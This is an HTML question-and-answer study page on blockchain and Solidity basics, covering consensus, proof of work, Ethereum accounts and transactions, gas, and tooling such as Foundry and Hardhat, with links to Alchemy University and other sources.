<h1>Solidity Questions and Answers</h1>

<h2>What's a dApps?</h2>
<p>A decentralized application (DApp) is a type of distributed, open source software application that runs on a peer-to-peer (P2P) blockchain network rather than on a single computer. <br>DApps are similar to other software applications that are supported on a website or mobile device, but they're P2P supported. <br>DApps are considered part of Web3, the present evolution of the World Wide Web. <br><br>The decentralized nature of DApps means that, once a developer has released a DApp's codebase, others can build on top of it. The app is not controlled by a single authority. DApp development creates a variety of applications, including those for decentralized finance, web browsing, gaming and social media. <br><br>DApps are built on a decentralized network supported by a blockchain distributed ledger. The use of blockchain means a DApp can process data through distributed networks and execute transactions. DApps are often built using the Ethereum platform.</p>
<a href="https://www.techtarget.com/iotagenda/definition/blockchain-dApp#:~:text=A%20decentralized%20application%20(DApp)%20is,but%20they're%20P2P%20supported." target="_blank" rel="noopener noreferrer">link</a>

<h2>What is Solana?</h2>
<p>Solana is a blockchain platform designed to host decentralized, scalable applications. Founded in 2017, it is an open-source project currently run by the Solana Foundation based in Geneva <br><br>Solana is much faster in terms of the number of transactions it can process and has significantly lower transaction fees than rival blockchains like Ethereum <br><br>Like Ethereum, Solana is a computing platform that can interact with smart contracts. Smart contracts power a wide range of applications, from NFT markets and DeFi to games and decentralized lotteries. <br><br>The primary Solana programming language is Rust, but C, C++, and even Python are supported. <br><br>Solana is a proof-of-stake (PoS) blockchain but improves on it with a mechanism called proof-of-history (PoH), which uses hashed timestamps to verify when transactions occur. <br><br>Despite its popularity, SOL did not escape the cryptocurrency wipeout of 2022. By Dec. 29, 2022, SOL had dropped to about $3.63 billion in market capitalization. One year later, it had recovered nearly half of its lost market cap.</p>
<a href="https://www.investopedia.com/solana-5210472" target="_blank" rel="noopener noreferrer">link</a>

<h2>What Is Terra?</h2>
<p>Terra is an open-source blockchain payment platform for an algorithmic stablecoin, which are cryptocurrencies that automatically track the price of currencies or other assets. <br>The Terra blockchain enables users to instantly spend, save, trade, or exchange Terra stablecoins. <br><br>The Terra protocol creates stablecoins designed to consistently track the price of a fiat currency (a government-backed currency such as the U.S. dollar or euro). It consists of two cryptocurrency tokens‚ÄîTerra and Luna. <br><br>The Terra protocol maintains the price of the Terra stablecoin by ensuring that the supply and demand for it are always balanced. This is achieved by using Luna as the variable counterweight to the Terra stablecoin.</p>
<a href="https://www.investopedia.com/terra-5209502" target="_blank" rel="noopener noreferrer">link</a>

<h2>What is Ethereums Yellow Paper?</h2>
<p>The Ethereum Yellow Paper is a formal specification of the Ethereum protocol, written by Dr. Gavin Wood in October 2014. It serves as a technical document that outlines the inner workings of the Ethereum blockchain and its associated virtual machine (EVM). <br><br>Here are some key points about the Ethereum Yellow Paper: <br><br>Technical Specification: The Yellow Paper provides a detailed and formal description of the Ethereum protocol, including the structure of blocks, transactions, state transitions, and the consensus mechanism. <br><br>Ethereum Virtual Machine (EVM): One of the central components described in the Yellow Paper is the Ethereum Virtual Machine (EVM). The EVM is a Turing-complete virtual machine that executes smart contracts on the Ethereum network. The Yellow Paper defines the opcode set and execution model of the EVM. <br><br>Cryptoeconomics: The Yellow Paper also covers the cryptoeconomic aspects of Ethereum, such as the mining process, block rewards, gas fees, and the incentive mechanisms designed to secure the network and encourage participation. <br><br>Formal Verification: The Yellow Paper is written in a formal and mathematical style, making it suitable for formal verification and analysis by researchers, developers, and auditors. It provides a precise specification of the Ethereum protocol, which helps ensure consistency and interoperability across different implementations of the Ethereum client software. <br><br>Reference Document: While the Yellow Paper is primarily aimed at developers and researchers familiar with cryptography and distributed systems, it also serves as a reference document for anyone interested in understanding the technical details of Ethereum. <br><br>Overall, the Ethereum Yellow Paper is an essential resource for understanding the design principles and technical intricacies of the Ethereum blockchain and its associated ecosystem. It has played a significant role in shaping the development of Ethereum and has been instrumental in fostering innovation and research in the blockchain space.</p>
<a href="https://ethereum.github.io/yellowpaper/paper.pdf" target="_blank" rel="noopener noreferrer">link</a>

<h2>What is the purpose of blockchain?</h2>
<p>The purpose of a blockchain is to have a network of computers agree upon a common state of data. Plain and simple. Any person or organization should be able to participate in this process. No person or organization should be able to control this process. <br><br>In, 2008 a person or persons, under the pseudonym Satoshi Nakamoto released a whitepaper for Bitcoin. <br>The paper describes a chain of blocks tied together cryptographically. This would later be coined the blockchain. <br><br>To tie it altogether, blockchain was invented to solve for trust. To create a system that is completely neutral and resistant to any censorship or bribe.</p>
<a href="https://university.alchemy.com/course/ethereum/md/630e3d0a456dc80004ad6b6d" target="_blank" rel="noopener noreferrer">link</a>

<h2>What are Smart Contract Blockchains?</h2>
<p>Smart Contract blockchains provide developers with a way to decentralize where the code runs. <br><br>The key difference which makes this code a smart contract is when you take this code, compile it and deploy it to a decentralized blockchain. When you do that, the code becomes publicly available on the blockchain and the nodes in the network will enforce the logic of the code through the financial incentives of the blockchain protocol</p>
<a href="https://university.alchemy.com/course/ethereum/md/630e3d0a456dc80004ad6b6d" target="_blank" rel="noopener noreferrer">link</a>

<h2>What are Cryptographic Hash Functions?</h2>
<p>A hash function is a function which takes an input of any size and turns it into a fixed size output. <br><br>With a secure cryptographic hash function you can create a unique, fixed-size representation of an input regardless of its size. For blockchains this feature is critically important for saving space. In many cases blockchains and smart contracts will not need to store an input, they can just store the hash output. Cryptographic Hash Functions will also be super important for the first successful blockchain consensus mechanism we'll talk about: proof of work.</p><p><br>Cryptographic hash functions must be: <br>üîÆ Deterministic - One specific input always maps to the same specific output <br>üé≤ Pseudorandom - It is not possible to guess the output based on the output of similar inputs <br>‚û°Ô∏è One-way - If someone gives you a new output, you could not determine an input without guessing <br>üèéÔ∏è Fast to Compute - It must be a quick calculation for a computer <br>üí• Collision-resistant - The chance of a collision should be infinitesimally small <br><br>Public key cryptography is considered asymmetric encryption in that only one party has access to the private key.</p><p></p><p>Cryptographic Hash Functions like <strong>SHA256</strong> are one-way functions. This means that if you have the input, it's relatively trivial to find the output. On the other hand, if you have the output, it is infeasible to find the input.</p>
<a href="https://university.alchemy.com/course/ethereum/md/630e3d0a456dc80004ad6b6d" target="_blank" rel="noopener noreferrer">link</a>

<h2>What is the Diffie-Hellman Key Exchange?</h2>
<p>The Diffie-Hellman key exchange is utilized in a hybrid cryptosystem since it uses asymmetric cryptography for the handshake and then symmetric cryptography for the message passing.</p>
<a href="https://university.alchemy.com/course/ethereum/md/630e3d0a456dc80004ad6b6d" target="_blank" rel="noopener noreferrer">link</a>

<h2>What is Blockchain network?</h2>
<p>Blockchain networks, like Ethereum, are essentially distributed and decentralized databases consisting of many nodes (fancy name for computers!). <br></p>
<a href="https://university.alchemy.com/course/ethereum/md/630e3d0a456dc80004ad6b6d" target="_blank" rel="noopener noreferrer">link</a>

<h2>What is Consensus mechanism?</h2>
<p>Consensus means coming to a general agreement. Blockchain consensus typically means at least 51% of nodes are in agreement over the current global state of the network. <br><br>Consensus mechanisms end up simply being rules that a distributed + decentralized blockchain network follows in order to stay in agreement over what is considered valid.</p>
<a href="https://university.alchemy.com/course/ethereum/md/630e3d0a456dc80004ad6b6d" target="_blank" rel="noopener noreferrer">link</a>

<h2>What is Proof of Work?</h2>
<p><strong>Proof-of-work</strong> is the consensus mechanism that allows decentralized networks like Bitcoin and (previously) Ethereum to come to consensus, or agree on things like account balances and the order of transactions. This prevents users from "<strong>double spending</strong>" their coins and ensures that everyone is following the rules, making proof-of-work-based networks resistant to attack. <br><strong>The consensus mechanism</strong> ends up providing security to a blockchain network just because it demands that everyone follow the consensus rules if they want to participate! <br><br><strong>In proof-of-work, mining is the "work" itself. </strong><br><br>In proof-of-work consensus, nodes in the network continuously attempt to extend the chain with new blocks - these are the <strong>miners</strong>, nodes that contain mining software. Miners are in charge of extending a blockchain by adding blocks that contain "valid" transactions. In order to add a block, the network will ask miners for their 'proof-of-work'. <br><br>Why do miners expend resources to secure a proof-of-work blockchain network like Ethereum or Bitcoin? In exchange for the large amounts of energy and hardware upkeep required to run mining software,<strong> miners receive currency as a reward</strong>. If the consensus rules are followed, making a secure network, miners get paid. <br><br>You can think of Proof of Work as the security of the Bitcoin system. Thousands of nodes are working to find hashes of data in the Bitcoin network at any given time. These machines are financially incentivized through rewards when they find the hash. This process is known as mining. ‚õèÔ∏è</p>
<a href="https://university.alchemy.com/course/ethereum/md/630e3d0a456dc80004ad6b6d" target="_blank" rel="noopener noreferrer">link</a>

<h2>What the proof-of-work mining algorithm looks like?</h2>
<p>Take current block‚Äôs block header, add mempool transactions <br>Append a nonce, starting at nonce = 0 <br>Hash data from #1 and #2 <br>Check hash versus target difficulty (provided by protocol) <br>If hash &lt; target, puzzle is solved! Get rewarded. <br>Else, restart process from step #2, but increment nonce</p>
<a href="https://university.alchemy.com/course/ethereum/md/630e3d0a456dc80004ad6b6d" target="_blank" rel="noopener noreferrer">link</a>

<h2>What is the 51% attack?</h2>
<p>In order to overpower this network and force your own version of the truth, you would need to come up with more computing power than all the nodes in the entire system. This is referred to as a 51% attack because <strong>you need to have 51% of the total hashing power </strong>in the network. Even accomplishing this you are extremely limited in what you can actually accomplish.</p>

<h2>What are blockchains?</h2>
<p><strong>Blockchains are just fancy databases</strong>. Databases have designs based on the data they store. <br>A blockchain is a distributed database of a list of validated blocks. Each block contains data in the form of transactions and each block is cryptographically tied to its predecessor, producing a "chain". <br><br>A blockchain has nodes scattered all over the world all acting together in real-time. There is no central administrator, say a "supernode", responsible for verifying any changes to the state of data, all nodes are equal members of the network. This means that the network will perform the same, no matter what node you interact with to update data. In other words, blockchains are peer-to-peer networks. <br><br>The server-based network contains one central server solely responsible for keeping the state of data. In the peer-to-peer network,<strong> there is not even a central server - everyone maintains a copy of the state of data</strong>.</p>

<h2>Where to see cool way to display what a blockchain is?</h2>
<a href="https://blockchaindemo.io/" target="_blank" rel="noopener noreferrer">link</a>

<h2>What requirements does adding new block needs to meet?</h2>
<p>Block index is one greater than latest block index. <br>Block previous hash equal to latest block hash. <br>Block hash meets difficulty requirement. <br>Block hash is correctly calculated.</p>

<h2>What is Foundry?</h2>
<p>Foundry is a blazing fast, portable and modular toolkit for Ethereum application development written in Rust. <br><br>Foundry consists of: <br><br><strong>Forge</strong>: Ethereum testing framework (like Truffle, Hardhat and DappTools).</p><p><br><strong>Cast</strong>: Swiss army knife for interacting with EVM smart contracts, sending transactions and getting chain data.</p><p><br><strong>Anvil</strong>: Local Ethereum node, akin to Ganache, Hardhat Network.</p><p><br><strong>Chisel</strong>: Fast, utilitarian, and verbose solidity REPL.</p>
<a href="https://github.com/foundry-rs/foundry" target="_blank" rel="noopener noreferrer">link</a>

<h2>What is Forge?</h2>
<p>Forge is a command-line tool that ships with Foundry. Forge tests, builds, and deploys your smart contracts. <br><br>Forge can run your tests with the forge test command. All tests are written in Solidity.</p>
<a href="https://book.getfoundry.sh/forge/" target="_blank" rel="noopener noreferrer">link</a>

<h2>What's a Proxy Contract?</h2>
<p>A proxy contract is a contract which delegates calls to another contract. To interact with the actual contract you have to go through the proxy, and the proxy knows which contract to delegate the call to (the target). <br><br>A proxy pattern is used when you want upgradability for your contracts. This way the proxy contract stays immutable, but you can deploy a new contract behind the proxy contract - simply change the target address inside the proxy contract. <br><br>Therefore it's a bit dangerous to use a proxy contract, since there are no guarantees that the underlying (target) contract hasn't been changed to a malicious one. There is no strict definition on how to detect a proxy contract, but basically it's anything that delegates the functionality to another contract. You have to analyze the source code to be able to decide. <br></p>
<a href="https://ethereum.stackexchange.com/questions/114809/what-exactly-is-a-proxy-contract-and-why-is-there-a-security-vulnerability-invol" target="_blank" rel="noopener noreferrer">link</a>

<h2>What's Gas on Ethereum Network?</h2>
<p>Gas is a measurement of the cost to each operation that relates to the computational cost that the operation incurs on the network. So if you are making every node in the network do some kind of computationally expensive task every time they need to verify your transaction, you'll need to pay for significantly more than a simple transaction that is sending money from one individual to another. <br><br>create or modify persistent data on the blockchain have significantly more costs associated with them than simple arithmetic operations. For example ADD requires 3 gas, while using SSTORE can require 20000 gas. Even the operation BALANCE has significant costs associated with it (700 gas) because it requires a lookup in persistent memory.</p>
<a href="https://university.alchemy.com/course/ethereum/md/614b9f3e7e426a001019bec9" target="_blank" rel="noopener noreferrer">link</a>

<h2>How to transfer funds?</h2>
<p>To transfer value in Bitcoin we spend UTXOs. In Ethereum there are no UTXOs. Instead, at the end of a transaction transferring ether, the transferred amount is subtracted from the sender's address balance and added to recipient's address balance in the global state tree. <br><br>Compared to UTXOs, an account balance is quite straightforward, especially from an application developer perspective. The EVM(Ethereum Virtual Machine) has an operation BALANCE that allows us to look up an addresses balance inside code running on the EVM. This is much simpler than adding all unspent transaction outputs that have a particular address as their recipient.</p>
<a href="https://university.alchemy.com/course/ethereum/md/614b9f3c7e426a001019be39" target="_blank" rel="noopener noreferrer">link</a>

<h2>What is a Smart Contract?</h2>
<p>The term Smart Contract sounds pretty intimidating at first glance. Don't worry about the name, it's simply a program that runs in the blockchain execution environment. <br><br>A smart contract is simply a program that runs on the Ethereum computer. More specifically, a smart contract is a collection of code (functions) and data (state) that resides on a specific address on the Ethereum blockchain. <br><br>As a developer, you would write a Smart Contract when you want to decentralize a program's execution. Smart Contracts are generally written in a high-level language like Solidity or Vyper. Once you've completed the code (and tested it thoroughly!) you can deploy the contract to the Ethereum blockchain. You can do so by running a transaction from your Externally Owned Account with the bytecode of the compiled smart contract. <br><br>This contract has its own account in that it also has a balance and address. The contract account cannot be controlled by a private key like a EOA. Instead, EOAs make transactions to call functions on the contract. From there, contracts can also make calls to other contracts synchronously. Once a contract is deployed, the code cannot be changed. However, the storage (persistent memory) of a contract can be updated through transactions.</p>

<h2>What's Smart Contract Updateability?</h2>
<p>A contract can store an address of another contract that it needs to interact with. Since the address is held in storage it can be updated through transactions. Therefore it's possible to upgrade a system by deploying new contracts and running a transaction to update references to point to the new addresses. This can be a bit of a challenging subject and is generally referred to as smart contract upgradeability.</p>

<h2>What are Externally Owned Accounts?</h2>
<p>Externally Owned Accounts (or EOAs for short!) are similar to Bitcoin private/public key pairs. <br><br>The biggest difference between EOAs and Bitcoin Addresses is that EOAs have a balance. This means that the global state of the blockchain actively tracks how much ether every active address on the network holds.</p>

<h2>Whats The History of Ethereum?</h2>
<p><strong>2013</strong> Ideation <strong>Vitalik Buterin releases the Ethereum white paper</strong>, proposing a new platform which would allow for decentralized application to mark the start of a new era of online transactions. </p><p><br><strong>2014 Initial Sale Ether </strong>officially goes on sale for the first time. <strong>The Yellow paper is released</strong>. </p><p><br><strong>2015</strong> Project Drops Ethereum mainnet launches. <strong>The Ethereum network goes live</strong>. </p><p><br><strong>2016</strong> Major Split Ethereum is <strong>split</strong> into two separate blockchains, <strong>Ethereum</strong>, and <strong>Ethereum Classic</strong>, as a result of a US$50 million worth of funds being hacked. </p><p><br><strong>2021</strong> EIP1559 Ethereum changes <strong>how the system processes and calculates transaction fees and gas </strong></p><p><br><strong>2022</strong> The Merge Ethereum transitions from Proof of Work to<strong> Proof of Stake</strong></p>
<a href="https://university.alchemy.com/course/ethereum/md/63911a1ffdaf860004511e98" target="_blank" rel="noopener noreferrer">link</a>

<h2>What are use cases of Ethereum?</h2>
<ul><li><p><strong>Ownership records</strong> - permanent way to verify ownership of a house or other asset</p></li><li><p><strong>Code</strong> - ability to deploy code to a public database where all parties can verify the functionality of it before buying in</p><p></p></li></ul><p>Other popular areas:</p><ul><li><p><strong>Decentralized finance</strong></p></li><li><p><strong>NFTs</strong></p></li><li><p><strong>DAOs</strong></p></li><li><p><strong>Further applications</strong></p></li></ul>

<h2>Where can I try sending JSON-RPC requests to ETH Blockchain?</h2>
<p>Try using the Alchemy Composer to make JSON-RPC requests in an instant! Try a few different methods!</p>
<a href="https://dashboard.alchemy.com/sandbox?network=ETH_MAINNET&method=eth_getBalance&body.id=1&body.jsonrpc=2.0&body.params%5B0%5D=0xe5cB067E90D5Cd1F8052B83562Ae670bA4A211a8&body.params%5B1%5D=latest&body.method=eth_getBalance" target="_blank" rel="noopener noreferrer">link</a>

<h2>What does Alchemy do?</h2>
<p>Alchemy is a web3 development platform that provides services including connections to high-uptime Ethereum nodes for developers... </p><p></p><p>Your Alchemy account will give you access to key features such as: </p><ul><li><p>creating an HTTP URL to an Ethereum node on the network of your choice </p></li><li><p>analytics for your web3 dApp </p></li><li><p>other development goodies like Enhanced APIs, the NFT API and the Alchemy SDK</p></li></ul>

<h2>What is JSON-RPC?</h2>
<p>JSON-RPC is a way to send and receive JSON-formatted messages between a client and a server. <br><br>Ethereum Full Nodes can provide access for queries and transactions by running a JSON-RPC API. </p><p></p><p>You can form queries like: </p><ul><li><p>running transactions,</p></li><li><p>querying address balances</p></li><li><p>or deploying a new contract! </p></li></ul><p></p><p>Very cool.</p>
<a href="https://university.alchemy.com/course/ethereum/md/614b9f3c7e426a001019be54" target="_blank" rel="noopener noreferrer">link</a>

<h2>What are Ethereum Full Nodes?</h2>
<p>Full nodes store and validate all blocks and transactions over the entire blockchain locally. </p><p></p><p>When a smart contract transaction is executed, Ethereum full nodes execute all of the instructions in the smart contract. </p><p></p><p>Together, full nodes determine whether the smart contract execution is producing the desired result. </p><p></p><p>However, running full Ethereum nodes is expensive to and can consume a great deal of energy.</p>

<h2>How does Ethereum store data and what are Merkle Patricia Tries?</h2>
<p>Ethereum stores data in <strong>Merkle Patricia Tries</strong>. <br><br>The <strong>root hash of the trie represents the entirety of its contents</strong> (if any data changes, the root is completely different).</p><p></p><p>Also, <strong>data can be proven to be part of a Merkle Patricia Trie without providing all of the data</strong>. <br><br>In addition to the Merkle Tree properties, the Merkle Patricia Trie has some major performance benefits for storing large amounts of data. <br><br>There are four types of tries used to store data in Ethereum: <br><br><strong>State Trie</strong> - This is the global state of the Ethereum network. There is only one state trie and it is constantly being updated by transactions when they are mined into the blockchain. <br><br><strong>Storage Trie</strong> - Each account has its own storage trie. This keeps track of all persistent variables within a contract account, also known as its storage. <br><br><strong>Transactions Trie</strong> - There is <strong>one transactions trie per block</strong> and it contains all of the transactions in a specific order determined by the miner. <br><br><strong>Receipts Trie</strong> -<strong> For each transaction</strong>, a receipt is stored that <strong>contains logs, gas used and post-transaction state</strong>. This receipts trie stores all of that data. </p>

<h2>Will I have to work with Merkle Patricia Trees to interact with Ethereum Blockchain?</h2>
<p>Don't worry about memorizing this information; you will likely never need to interface with these tries directly. Either you'll invoke an opcode on the EVM when you write a Smart Contract or you'll use the JSON-RPC API (often with the assistance of a library) to interact with an Ethereum Node on a much higher-level.</p>

<h2>What is the Nonce?</h2>
<p>The account nonce is simply a counter of all the transactions sent by an address.</p><p></p><p>Every time you send a transaction from your account the counter goes up by 1. This makes each request unique, even if it has the same parameters!</p><p></p><p>Each time you sign a transaction, you'll sign it with the latest transaction count as the nonce.</p><p></p><p>If your or someone else tries to replay a transaction with a nonce lower than your transaction count, it will be rejected by the network.</p>

<h2>Wait, So An Account Can Be A Smart Contract?</h2>
<p>Yes. There are two types of accounts in Ethereum: <br><br>1. <strong>EOA</strong> - This is an account directly controlled by a private key.<br>An EOA cannot contain EVM code.<br><br>2. <strong>Contract account</strong> - This is an account that does NOT have a private key.<br>As seen in the diagram, this account contains two extra properties on its state: <br><strong>Storage hash</strong> -  contains the root hash of a Merkle patricia trie that holds any state relevant to this smart contract account (ie. variable values, owners, etc) <br><strong>Code hash</strong>: bytecode representation of skeleton code</p>
<a href="https://university.alchemy.com/course/ethereum/md/639182cc7beab00004f49ca2" target="_blank" rel="noopener noreferrer">link</a>

<h2>How Are The Account Public Addresses Determined?</h2>
<p>If the account is an EOA, the Ethereum public address is derived from the private key. </p><p>If the account is a <strong>smart contract</strong>, that smart contract public address is derived from the <strong>deployer address and the deployer nonce value</strong>. <br><br>The output, regardless of whether the account is an EOA or a smart contract, is always 160 bits representing the Ethereum public address. You'll typically hear Ethereum public addresses described as 20 bytes long with a 0x appended in front. You may also hear Ethereum addresses are 40-characters long, or 42 with the 0x appended in front.</p>

<h2>What's a Transaction?</h2>
<p>A transaction is a single cryptographically-signed instruction. It is a signal of intent from an owner of a private key that they want to change the Ethereum state in one way or another. <br><br><strong>Reading data from Ethereum does not require an account!</strong> Anyone can ping the Ethereum computer and read data instantly.<br><br>But writing data requires you own a private key and some ETH (to pay for gas!)... <strong>all write operations cost gas</strong> and so you need ETH to pay for that gas. <strong>And all write operations must be signed by a private key!</strong></p>

<h2>Can smart contract accounts initiate a transaction?</h2>
<p><strong>Only an EOA can send a transaction to Ethereum</strong>. EOAs are typically human-controlled accounts; humans are in the real physical world. <br><br>The bridge to the Ethereum metaverse is transcended via submitting transactions. As an external entity to the Ethereum computer, an EOA signals an intent to change state in the metaverse with a valid transaction.</p>

<h2>What are the Two Types of Transactions in Ethereum?</h2>
<ol><li><p><strong>Contract creation</strong>: a special type of transaction that deploys a brand new smart contract This transaction essentially creates a brand new entry in the Ethereum world state </p></li><li><p><strong>Message call</strong>: a transaction initiated by an EOA that interacts with either another EOA or a smart contract. </p><p>This transaction does NOT create a new entry in the world state, it just updates an existing entry in the Ethereum world state. </p></li></ol><p><br>If you want to read data from Ethereum, a standard JSON-RPC request will do (ie. eth_getBalance). If you want to write data to Ethereum, a signed JSON-RPC request is needed, otherwise referred to as, a transaction.</p>

<h2>Whats goerli testnet faucet that works, without bullshit?</h2>
<p>https://www.reddit.com/r/ethdev/comments/12kro66/goerli_faucet_that_works_without_bullshit/ <br><br>https://faucets.pk910.de/</p>
<a href="https://goerli-faucet.pk910.de/#/" target="_blank" rel="noopener noreferrer">link</a>

<h2>What to use to interact with Ethereum blockchains on the Web?</h2>
<p>Virtually every web3 website, or dapp that you have ever used uses one of <strong>web3.js</strong> or <strong>ethers.js.</strong> </p><p></p><p>Together, they are the two most popular Ethereum Javascript libraries that allow developers to interact with Ethereum or EVM-compatible blockchains using the JSON-RPC.</p>

<h2>What's the API reference for Alchemy?</h2>
<a href="https://docs.alchemy.com/reference/eth-getblockbynumber" target="_blank" rel="noopener noreferrer">link</a>

<h2>Whats the official website for Ethereum?</h2>
<a href="https://ethereum.org/en/eth" target="_blank" rel="noopener noreferrer">link</a>

<h2>Where can I find Ethers.js documentation?</h2>
<a href="https://docs.ethers.org/v6/" target="_blank" rel="noopener noreferrer">link</a>

<h2>Where to learn Ethereum Blockchain Development?</h2>
<p>Great introduction https://www.alchemy.com/overviews/learn-solidity <br><br>https://medium.com/nerd-for-tech/top-10-resources-for-learning-solidity-70de3566ff0b <br><br>Calyptus https://calyptus.co/welcome/ <br><br>and <br><br>Alchemy https://university.alchemy.com/</p>

<h2>What is Solidity?</h2>
<p>As per the official docs, Solidity is an <strong>object-oriented, high-level language for implementing smart contracts</strong>. It is a language that closely resembles other popular programming languages like C++, Python and JavaScript. <br><br>Here are some important properties of the Solidity language: <br>statically-typed (fancy term meaning variables must be defined at compile time)</p><ul><li><p><strong>supports inheritance</strong>: (specifically, smart contract inheritance chains)</p></li><li><p><strong>libraries</strong></p></li><li><p><strong>complex user-defined types</strong>, among other features</p></li></ul><p><br>Solidity is a programming language used to write smart contracts.</p>
<a href="https://university.alchemy.com/course/ethereum/md/639b628421387900043e587b" target="_blank" rel="noopener noreferrer">link</a>

<h2>What are Properties of Smart Contracts?</h2>
<p><strong>Permissionless</strong> - anyone can deploy a smart contract to the Ethereum computer.<br>The only requirement here is some ETH in order to pay for gas fees! ‚õΩÔ∏è <br><br><strong>Composable</strong> - smart contracts are globally available via Ethereum, so they can be thought of as <strong>open APIs for anyone to use</strong>.<br>Functions in smart contracts can be thought of as globally accessible API endpoints! ü§Ø</p>

<h2>How does Solidity Constructor work?</h2>
<p>The constructor() function is called only once during deployment and completely discarded thereafter. It is typically used to specify state when deploying a contract.</p>

<h2>What Are Different Types in Solidity?</h2>
<p><strong>boolean</strong> - declared as bool <br><strong>string</strong> - declared as string <br><strong>integers</strong> - declared as either uint or int <br><strong>bytes</strong> - decalred as bytes <br><strong>enums</strong> <br><strong>arrays</strong> <br><strong>mappings</strong> <br><strong>structs</strong> <br><strong>Solidity</strong> - address and address payable</p>

<h2>What is the address Type in Solidity?</h2>
<p>The address type comes in two flavours, which are largely identical:</p><ul><li><p><strong>address</strong>: Holds a 20 byte value (size of an Ethereum address).</p></li><li><p><strong>address payable</strong>: Same as address, but with the additional members <strong>transfer</strong> and <strong>send</strong>.</p></li></ul><p><br>address and address payable are first-class types, meaning they are more than simple strings holding some Ethereum address value. Any address, either passed in to a function or cast from a contract object, has a number of attributes and methods directly accessible on it:</p><ul><li><p><strong>address.balance</strong>: returns the balance, in units of wei</p></li><li><p><strong>address.transfer</strong>: sends ether to a address payable type</p></li></ul><p><br>Curious to know a smart contract's own balance? Just use <strong>address(this).balance</strong>! ‚úÖ</p>

<h2>What is Smart Contract Context?</h2>
<p>When a smart contract function is called via a transaction, the called function gets some extra information passed to it. Within a smart contract function you‚Äôll have access to these context variables, including:</p><p></p><ol><li><p><strong>Message Context (msg)</strong></p><ul><li><p><strong>msg.sender</strong> - returns the current transaction sender address</p></li><li><p><strong>msg.value</strong> - returns the value property of the current transaction</p><p></p></li></ul></li><li><p><strong>Transaction Context (tx)</strong></p><ul><li><p><strong>tx.gasLimit</strong> - returns the gasLimit property of the current tx</p><p></p></li></ul></li><li><p><strong>Block Context (block)</strong></p><ul><li><p><strong>block.number</strong> - returns the current block number</p></li><li><p><strong>block.timestamp</strong> - returns the current block timestamp</p></li></ul></li></ol>

<h2>What are function declarations in Solidity?</h2>
<p><strong>view</strong> - this function promises that** NO state will be changed, only read** <br><br><strong>pure</strong> - this function promises that NO state will be changed nor read <br><br>pure functions are typically used in libraries or for functionality that is not specific to a smart contract's state but is still needed for independent contract operations.</p>

<h2>How to Write changes to Storage in Solidity</h2>
<p>A function can write (fancy term for changing some state) if it is NOT pure or view. <br><br><strong>Storage is expensive on the Ethereum network!</strong> üí∏ </p><p></p><p>As a developer, you must always be optimizing for the least friction possible when changing state so that you do not incur large gas costs to you or your users!</p>

<h2>What are different Visibilities of Solidity Functions?</h2>
<ul><li><p><strong>public</strong> - any contract or EOA can call into this function</p></li><li><p><strong>external</strong> - only other contracts (external to the current contract) and EOAs can call, no internal calling</p></li><li><p><strong>internal</strong> - only this contract along with its inheritance chain can call</p></li><li><p><strong>private</strong> - only this contract can call</p></li></ul><p></p><p>üö® State variables work off the same exact criteria for visibility. State variables can be declared as public, private, or internal but not external.</p>

<h2>What's an ABI?</h2>
<p>An ABI defines how data structures and functions are accessed in the machine code. Thus, this is the primary way of encoding/decoding data in and out of machine code. <br><br>You can think of an ABI as a <strong>general encoding/decoding bridge for machine code.</strong> ü§ñ <br><br>In Ethereum, the purpose of the ABI is to: <br></p><ol><li><p>define the functions in the contract that can be invoked and...</p></li><li><p>describe how each function will accept arguments and return its result</p></li></ol><p><br><strong>ABI of a contract is just one big JSON object</strong>. As developers, we simply need to know that the <strong>ABI is necessary in order for front-end tools to be able to interface and thus communicate with a smart contract</strong>!</p>

<h2>How to Interact With a Smart Contract In Web App?</h2>
<p>If your web application wants to interact with a smart contract on Ethereum, it needs: </p><p></p><ul><li><p>the contract's address</p></li><li><p>the contract's ABI</p></li></ul><p><br>We provide the ABI to the front-end library. The front-end library then translates and delivers any requests we make using that ABI.</p>

<h2>What is Contract Bytecode?</h2>
<p>Now let's look at what is produced at contract deployment: <strong>the contract's bytecode</strong>. </p><p></p><p>Contract bytecode is the <strong>translation</strong> of that smart contract that <strong>machines can understand</strong>, specifically the EVM. It represents the actual program, in machine code, on the Ethereum computer. <br><br>1. Creation time bytecode - is executed only once at deployment, contains the constructor <br>2. Run time bytecode - is stored on the blockchain as permanent executable </p>

<h2>What's a Receipt Trie?</h2>
<p>Anytime a transaction occurs on the Ethereum network, the receipt is stored in the receipt trie of that block. The trie contains four pieces of information: </p><p></p><ul><li><p>Post-Transaction State </p></li><li><p>Cumulative Gas Used </p></li><li><p>Set of Logs Created During Execution (ie. did any events fire?) </p></li><li><p>Bloom Filter Composed from the Logs</p></li></ul>

<h2>What is Hardhat?</h2>
<p>Hardhat is a development environment to <strong>compile</strong>, <strong>deploy</strong>, <strong>test</strong>, and <strong>debug Ethereum smart contracts</strong>. <br><br>Hardhat Features:</p><p></p><ul><li><p><strong>Local testing</strong>, including local Hardhat Network (super useful!!)</p></li><li><p>Solidity <strong>compilation and error-checking</strong></p></li><li><p>Flexible combination with other tooling/plugins (ie, Ethers.js)</p></li><li><p><strong>Easy deployment</strong> of and <strong>interaction</strong> with smart contracts</p></li></ul><p></p><p>Hardhat is one of the ultimate web3 developer tools. It is specifically built cover the entire smart contract developer flow end-to-end.</p>
<a href="https://university.alchemy.com/course/ethereum/md/639ac11a1422ec000466be36" target="_blank" rel="noopener noreferrer">link</a>

<h2>What's a payable function?</h2>
<p>A payable function is one that can receive ether. The receive function is a special function that will be invoked when a smart contract receives ether.</p>
<a href="https://university.alchemy.com/course/ethereum/md/63989fdfc364970004243bf6" target="_blank" rel="noopener noreferrer">link</a>

<h2>What is the Ethereum Message?</h2>
<p>When we have an Externally Owned Account and we want to communicate with the Ethereum Network we broadcast a transaction. Inside this transaction we can choose to send data which is bytecode intended to interact with the EVM. <br><br>The data, often referred to as the calldata, is used to pass a message into the EVM. <br><br>In Solidity we have access to these message through global variables: <br></p><ul><li><p><strong>msg.data</strong> (bytes) - the complete calldata </p></li><li><p><strong>msg.sender</strong> (address) - the address sending the message </p></li><li><p><strong>msg.sig</strong> (bytes4) - the targeted function signature </p></li><li><p><strong>msg.value </strong>(uint) - the amount of wei sent </p></li></ul>

<h2>Why the msg.sig is 4 bytes?</h2>
<p>Wondering why the msg.sig is 4 bytes?</p><p></p><p>This value is actually <strong>the first four bytes of the keccak256 hash of the function signature</strong>.</p><p></p><p>It provides a way to uniquely identify (and target) the functions on a smart contract without worrying about how long the function signature is.</p><p></p><p>Otherwise you could potentially store a reallyLongNameForAFunction and the calldata would need to store all of this information to invoke that function! üò±</p>

